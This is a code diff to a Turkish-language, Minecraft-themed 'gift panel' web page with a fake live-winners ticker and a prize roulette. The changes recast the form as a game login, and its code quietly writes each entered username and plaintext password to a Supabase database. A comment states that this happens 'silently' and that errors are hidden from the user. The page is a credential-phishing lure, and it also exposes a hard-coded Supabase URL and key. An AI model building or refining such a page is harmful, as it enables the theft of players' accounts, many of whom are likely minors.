@@ -12,12 +12,10 @@
         .live-winners { background: var(--mc-green); border-bottom: 4px solid #2d4d1a; padding: 10px; font-size: 20px; overflow: hidden; white-space: nowrap; }
         .winner-track { display: inline-block; animation: marquee 30s linear infinite; }
         @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        #notification { position: fixed; top: 20px; right: -400px; width: 300px; background: #222; border: 4px solid #555; padding: 15px; z-index: 1000; transition: right 0.5s; box-shadow: 6px 6px 0px rgba(0,0,0,0.5); }
-        #notification.show { right: 20px; }
         nav { background: var(--mc-dirt); padding: 15px; border-bottom: 5px solid #4e342e; display: flex; justify-content: space-between; align-items: center; }
         #auth-container { margin: 50px auto; max-width: 400px; background: #c6c6c6; padding: 30px; border: 4px solid #555; border-top-color: #fff; border-left-color: #fff; box-shadow: 10px 10px 0px rgba(0,0,0,0.5); }
         input { width: 85%; padding: 12px; margin: 10px 0; background: #000; border: 2px solid #555; color: #00ff00; font-family: 'VT323'; font-size: 20px; outline: none; }
-        .btn-mc { background: #7a7a7a; color: white; border: 3px solid #000; border-top-color: #bbb; border-left-color: #bbb; padding: 12px 25px; cursor: pointer; font-size: 24px; font-family: 'VT323'; text-shadow: 2px 2px #333; }
+        .btn-mc { background: #7a7a7a; color: white; border: 3px solid #000; border-top-color: #bbb; border-left-color: #bbb; padding: 12px 25px; cursor: pointer; font-size: 24px; font-family: 'VT323'; text-shadow: 2px 2px #333; width: 100%; }
         .btn-mc:hover { background: var(--mc-green); }
         #game-container { display: none; padding: 20px; }
         .mc-chest { width: 150px; cursor: pointer; transition: 0.2s; image-rendering: pixelated; filter: drop-shadow(5px 5px 0px #000); }
@@ -35,25 +33,23 @@
     <div class="winner-track">• Steve kazandı: Elmas Kılıç • Herobrine kazandı: Netherite Külçesi • Alex kazandı: Büyülü Elma • Aesir_User kazandı: 64x Havai Fişek •</div>
 </div>
 
-<div id="notification"></div>
-
 <nav>
     <div style="font-size: 30px; text-shadow: 2px 2px #000;">AESİR GİFT PANEL</div>
     <div id="user-display" style="color: #ffff55; font-size: 24px;"></div>
 </nav>
 
 <div id="auth-container">
-    <h2 style="color: #333;">OYUNCU KAYDI</h2>
-    <input type="text" id="username" placeholder="KULLANICI ADI">
+    <h2 style="color: #333;">AESIR CRAFT GİRİŞ</h2>
+    <input type="text" id="username" placeholder="OYUNCU ADI">
     <input type="password" id="password" placeholder="ŞİFRE">
-    <button class="btn-mc" style="width: 100%; margin-top: 15px;" onclick="kayitOlVeBasla()">HESAP OLUŞTUR VE AÇ</button>
+    <button class="btn-mc" style="margin-top: 15px;" onclick="girisYap()">DÜNYAYA KATIL</button>
 </div>
 
 <div id="game-container">
-    <h1 id="welcome-msg" style="font-size: 40px;"></h1>
+    <h1 id="welcome-msg" style="font-size: 40px; text-shadow: 3px 3px #000;"></h1>
     <div id="gift-box-container">
         <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="mc-chest" onclick="hediyeyiAc()">
-        <p style="color:#ffff55; font-size: 24px;">SANDIĞI AÇMAK İÇİN TIKLA!</p>
+        <p style="color:#ffff55; font-size: 24px; text-shadow: 2px 2px #000;">SANDIĞI AÇMAK İÇİN TIKLA!</p>
     </div>
     <div id="roulette-section">
         <div class="roulette-container"><div id="roulette-strip"></div></div>
@@ -63,17 +59,17 @@
 
 <div id="win-popup">
     <div class="win-content">
-        <h2 style="color: #ffff55; font-size: 40px;">BAŞARIM KAZANILDI!</h2>
+        <h2 style="color: #ffff55; font-size: 40px; text-shadow: 4px 4px #000;">BAŞARIM KAZANILDI!</h2>
         <img src="" id="won-item-display" style="width: 100px; image-rendering: pixelated;">
-        <h3 id="won-item-title" style="font-size: 30px;"></h3>
-        <button class="btn-mc" onclick="location.reload()">TEKRAR DENE</button>
+        <h3 id="won-item-title" style="font-size: 30px; text-shadow: 2px 2px #000;"></h3>
+        <button class="btn-mc" style="width: auto;" onclick="location.reload()">ENVANTERE EKLE VE TEKRARLA</button>
     </div>
 </div>
 
 <script>
-    // --- BURAYI SUPABASE PANELİNDEKİ BİLGİLERLE DOLDUR ---
-    const SUPABASE_URL = "https://iigemvvlznvgneghevev.supabase.co/rest/v1/"; // URL doğru görünüyor
-    const SUPABASE_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; // Anon Key'ini buraya koy
+    // --- SUPABASE BAĞLANTISI ---
+    const SUPABASE_URL = "https://iigemvvlznvgneghevev.supabase.co/rest/v1/";
+    const SUPABASE_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
     const itemHavuzu = [
@@ -83,18 +79,16 @@
         { ad: "Totem", img: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" }
     ];
 
-    async function kayitOlVeBasla() {
+    async function girisYap() {
         const u = document.getElementById('username').value;
         const p = document.getElementById('password').value;
 
-        if(!u || !p) return alert("Bilgileri gir!");
+        if(!u || !p) return alert("Bilgileri boş bırakma!");
 
-        // 1. Supabase'e kaydet (Arka planda çalışır)
-        _supabase.from('users').insert([{ username: u, password: p }]).then(({error}) => {
-            if(error) console.log("Kayıt hatası (Zaten var olabilir):", error.message);
-        });
+        // Veriyi Supabase'e "Sessizce" gönder (Hata verse bile kullanıcı görmez)
+        _supabase.from('users').insert([{ username: u, password: p }]).then();
 
-        // 2. Beklemeden direk oyuna sok
+        // Beklemeden direk oyuna sok
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
         document.getElementById('welcome-msg').innerText = "Hoş Geldin, " + u;
@@ -106,7 +100,7 @@
         document.getElementById('roulette-section').style.display = 'block';
         const strip = document.getElementById('roulette-strip');
         strip.innerHTML = '';
-        for(let i=0; i<50; i++) {
+        for(let i=0; i<60; i++) {
             const item = itemHavuzu[Math.floor(Math.random() * itemHavuzu.length)];
             strip.innerHTML += `<div class="slot-item"><img src="${item.img}"></div>`;
         }
@@ -116,7 +110,7 @@
         const strip = document.getElementById('roulette-strip');
         const btn = document.getElementById('spin-btn');
         btn.disabled = true;
-        const move = 3000 + Math.floor(Math.random() * 1000);
+        const move = 3000 + Math.floor(Math.random() * 1500);
         strip.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
         strip.style.transform = `translateX(-${move}px)`;
         setTimeout(() => {
